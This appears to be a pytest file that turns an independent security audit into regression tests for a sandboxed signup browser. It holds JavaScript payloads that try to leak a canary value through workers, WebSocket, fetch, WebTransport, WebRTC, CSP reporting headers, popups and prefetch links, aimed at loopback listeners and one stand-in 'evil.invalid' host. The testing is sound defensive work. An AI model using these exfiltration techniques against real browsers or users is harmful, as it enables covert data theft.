"""Round-3 independent audit FAIL scenarios as permanent tests (loopback fixture only).

Each vector runs twice: with every layer on, and 'network_only' where the JavaScript init
script, the injected CSP and the WebSocket mock are all switched off, so only the browser
launch flags (DNS, refusing proxy, no QUIC/WebRTC UDP) stand between the page and the
canary listeners. A control (listener reachable from a plain browser) proves the listeners work."""
import socket
import threading

import pytest

from meemee.guided_signup import Engine
from test_audit_round2 import CANARY, Listener, prime


class UdpListener:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(('127.0.0.1', 0))
        self.port = self.sock.getsockname()[1]
        self.packets = 0
        threading.Thread(target=self.run, daemon=True).start()

    def run(self):
        while True:
            try:
                self.sock.recvfrom(65536)
            except OSError:
                return
            self.packets += 1

    def close(self):
        self.sock.close()


@pytest.fixture(params=['all_layers', 'network_only'])
def layers(request, monkeypatch):
    if request.param == 'network_only':
        monkeypatch.setattr(Engine, 'CHANNEL_BLOCK_JS', '(()=>{})();', raising=False)
        monkeypatch.setattr(Engine, 'CSP', '', raising=False)
        monkeypatch.setattr(Engine, 'INTERCEPT_WS', False, raising=False)
    return request.param


@pytest.fixture
def tcp():
    l = Listener()
    yield l
    l.close()


@pytest.fixture
def udp():
    l = UdpListener()
    yield l
    l.close()


def nothing_arrived(tcp, udp=None):
    assert tcp.connections == 0 and CANARY.encode() not in tcp.data
    if udp is not None:
        assert udp.packets == 0


def test_control_listeners_are_reachable_from_an_unlocked_browser(tcp):
    from playwright.sync_api import sync_playwright
    with sync_playwright() as pw:
        b = pw.chromium.launch(executable_path='/usr/bin/google-chrome', args=['--no-sandbox'])
        page = b.new_page()
        try:
            page.goto('http://127.0.0.1:%d/' % tcp.port)
        except Exception:
            pass  # the canary answers 400; only the connection matters
        b.close()
    assert tcp.connections == 1


def test_launch_flags_name_only_the_reviewed_origin(layers, env):
    args = Engine._launch_args([env[3]])
    port = env[0].origin.rsplit(':', 1)[1]
    assert any(a.startswith('--proxy-bypass-list=<-loopback>;127.0.0.1:%s' % port) for a in args)
    assert '--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE 127.0.0.1' in args and '--disable-quic' in args


WORKER_WS = """([port,p])=>{const src=`const w=new WebSocket('ws://127.0.0.1:${port}/?p='+encodeURIComponent('${p}'));
  w.onopen=()=>w.send('${p}')`;
  try{new Worker(URL.createObjectURL(new Blob([src])))}catch(e){}}"""
WORKER_FETCH = """([port,p])=>{const src=`fetch('http://127.0.0.1:${port}/?p=${p}',{method:'POST',mode:'no-cors',body:'${p}'}).catch(()=>{})`;
  try{new Worker(URL.createObjectURL(new Blob([src])))}catch(e){}}"""
SHARED_FETCH = """([port,p])=>{const src=`fetch('http://127.0.0.1:${port}/?p=${p}',{method:'POST',mode:'no-cors',body:'${p}'}).catch(()=>{})`;
  try{new SharedWorker(URL.createObjectURL(new Blob([src])))}catch(e){}}"""
IMPORT_SCRIPTS = """([port,p])=>{const src=`try{importScripts('http://127.0.0.1:${port}/x.js?p=${p}')}catch(e){}`;
  try{new Worker(URL.createObjectURL(new Blob([src])))}catch(e){}}"""
WORKER_UDP = """([port,p])=>{const src=`try{const t=new WebTransport('https://127.0.0.1:${port}/?p=${p}');t.ready.catch(()=>{});t.closed.catch(()=>{})}catch(e){}`;
  try{new Worker(URL.createObjectURL(new Blob([src])))}catch(e){}}"""
PAGE_UDP = """([port,p])=>{try{const t=new WebTransport('https://127.0.0.1:'+port+'/?p='+p);t.ready.catch(()=>{});t.closed.catch(()=>{})}catch(e){}}"""
PAGE_RTC = """([port,p])=>{try{const c=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:'+port}]});
  c.createDataChannel('x');c.createOffer().then(o=>c.setLocalDescription(o)).catch(()=>{})}catch(e){}}"""


@pytest.mark.parametrize('name,js', [('worker_blob_websocket', WORKER_WS), ('worker_blob_fetch', WORKER_FETCH),
                                     ('sharedworker_fetch', SHARED_FETCH), ('importscripts', IMPORT_SCRIPTS)])
def test_worker_vectors_cannot_reach_another_loopback_port(layers, env, tcp, name, js):
    run, page = prime(env)
    page.evaluate(js, [tcp.port, CANARY])
    page.wait_for_timeout(1500)
    nothing_arrived(tcp)


@pytest.mark.parametrize('name,js', [('worker_udp_webtransport', WORKER_UDP), ('page_udp_webtransport', PAGE_UDP),
                                     ('webrtc_stun_udp', PAGE_RTC)])
def test_udp_vectors_send_no_datagram(layers, env, tcp, udp, name, js):
    run, page = prime(env)
    page.evaluate(js, [udp.port, CANARY])
    page.wait_for_timeout(2000)
    nothing_arrived(tcp, udp)


def test_attacker_csp_report_uri_header_is_stripped_and_nothing_is_reported(layers, env, tcp):
    site = env[0]
    site.extra_headers = {
        'Content-Security-Policy': "default-src 'none'; report-uri http://127.0.0.1:%d/r" % tcp.port,
        'Content-Security-Policy-Report-Only': "default-src 'none'; report-uri http://127.0.0.1:%d/ro" % tcp.port,
        'Report-To': '{"group":"g","max_age":9999,"endpoints":[{"url":"http://127.0.0.1:%d/rt"}]}' % tcp.port,
        'Reporting-Endpoints': 'g="http://127.0.0.1:%d/re"' % tcp.port,
        'NEL': '{"report_to":"g","max_age":9999}'}
    run, page = prime(env)
    headers = page.evaluate("()=>fetch('/signup').then(r=>[...r.headers].map(([k,v])=>k+': '+v).join('\\n'))")
    low = headers.lower()
    assert 'report-uri' not in low and 'report-to' not in low and 'reporting-endpoints' not in low and 'nel:' not in low
    page.evaluate("""()=>{const i=document.createElement('img');i.src='http://127.0.0.1:1/x';document.body.appendChild(i);
        try{eval('1')}catch(e){}}""")
    page.wait_for_timeout(1500)
    nothing_arrived(tcp)


def test_form_target_blank_opens_no_connection_and_no_second_tab(layers, env, tcp):
    run, page = prime(env)
    context = env[5].sessions[run['id']][0]
    page.evaluate("""([port,p])=>{const f=document.createElement('form');f.method='post';f.target='_blank';
        f.action='http://127.0.0.1:'+port+'/';const i=document.createElement('input');i.name='p';i.value=p;
        f.appendChild(i);document.body.appendChild(f);f.submit()}""", [tcp.port, CANARY])
    page.wait_for_timeout(1500)
    nothing_arrived(tcp)
    assert len(context.pages) == 1


def test_window_open_and_link_target_blank_open_no_second_tab(layers, env, tcp):
    run, page = prime(env)
    context = env[5].sessions[run['id']][0]
    page.evaluate("""([port,p])=>{window.open('http://127.0.0.1:'+port+'/?p='+p);
        const a=document.createElement('a');a.href='http://127.0.0.1:'+port+'/?p='+p;a.target='_blank';
        document.body.appendChild(a);a.click()}""", [tcp.port, CANARY])
    page.wait_for_timeout(1500)
    nothing_arrived(tcp)
    assert len(context.pages) == 1


def test_dns_prefetch_preconnect_prefetch_and_hostname_aliases_reach_nothing(layers, env, tcp):
    run, page = prime(env)
    page.evaluate("""([port,p])=>{for(const [rel,href] of [['preconnect','http://127.0.0.1:'+port],
        ['dns-prefetch','//evil.invalid'],['prefetch','http://127.0.0.1:'+port+'/?p='+p],
        ['prerender','http://127.0.0.1:'+port+'/?p='+p],['preload','http://127.0.0.1:'+port+'/?p='+p]]){
        const l=document.createElement('link');l.rel=rel;l.href=href;if(rel==='preload')l.as='fetch';document.head.appendChild(l)}
        fetch('http://localhost:'+port+'/?p='+p,{mode:'no-cors'}).catch(()=>{});
        fetch('http://[::1]:'+port+'/?p='+p,{mode:'no-cors'}).catch(()=>{})}""", [tcp.port, CANARY])
    page.wait_for_timeout(2000)
    nothing_arrived(tcp)


def test_pages_see_the_reviewed_origin_still_works(layers, env):
    run, page = prime(env)
    assert page.evaluate("()=>fetch('/signup').then(r=>r.status)") == 200


def test_every_response_carries_our_csp_and_no_reporting_directive(env):
    run, page = prime(env)
    csp = page.evaluate("()=>fetch('/signup').then(r=>r.headers.get('content-security-policy'))")
    assert "worker-src 'none'" in csp and "connect-src 'self'" in csp and 'report' not in csp
